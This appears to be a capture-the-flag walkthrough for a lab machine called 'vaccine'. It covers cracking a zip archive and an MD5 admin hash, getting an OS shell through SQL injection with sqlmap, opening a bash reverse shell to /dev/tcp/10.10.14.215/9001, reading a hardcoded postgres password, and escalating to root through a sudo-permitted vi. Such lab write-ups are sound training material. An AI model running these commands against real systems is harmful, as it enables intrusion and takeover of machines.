First is to access the FTP site

and use the tool `zip2john` to retrieve the `hash` of the password and use `john` to crack it.

`john 'wordlist url' hash.txt`

then we can see the `index.php` and inside we can see the admin credential and the password but it is in a `md5` hash. We will use crackstation to crack it.

`admin:qwerty789`

then we will use sqlmap to get a `--os-shell` to the machine

`sqlmap -u 'http://10.129.235.101/dashboard.php?search=meta' --cookie="PHPSESSID=dql4fqmneifemsggocu7tslpgp" --os-shell`

We will then issue a reverse shell 

`bash -c "bash -i >& /dev/tcp/10.10.14.215/9001 0>&1"`

Then we can find the postgresql password inside `/var/www/html/dashboard.php`

` $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");`

We will now do `sudo -l` to check what it can run as sudo without password.

```
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

By using this site (https://gtfobins.github.io/gtfobins/vi/)

We can try few things but the thing that works for me is to

`sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`

and press `esc` and `:` and type `!/bin/sh`

then a shell will spawn

```
postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf

# whoami
root
# cd /root
# ls
pg_hba.conf  root.txt  snap
# cat root.txt
dd6e058e814260bc70e9bbdef2715849
# 
```


